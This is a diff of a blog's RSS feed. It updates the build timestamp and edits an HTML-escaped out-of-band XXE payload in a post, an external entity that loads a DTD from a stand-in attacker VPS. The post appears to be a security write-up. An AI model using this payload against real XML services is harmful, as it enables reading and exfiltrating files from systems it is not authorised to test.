@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Tue, 17 Mar 2020 16:47:24 +0800</lastBuildDate>
+        <lastBuildDate>Tue, 17 Mar 2020 16:49:50 +0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss+xml" href="https://ajatars.github.io/rss.xml" />
         
@@ -635,7 +635,7 @@ EOD;
 
 &lt;!DOCTYPE ANY[
 
-&lt;!ENTITY % send SYSTEM 'http://your_vps/test2.dtd'&gt;
+&lt;!ENTITY % send SYSTEM 'http://vps/eval.dtd'&gt;
 
 %send;
 %test;
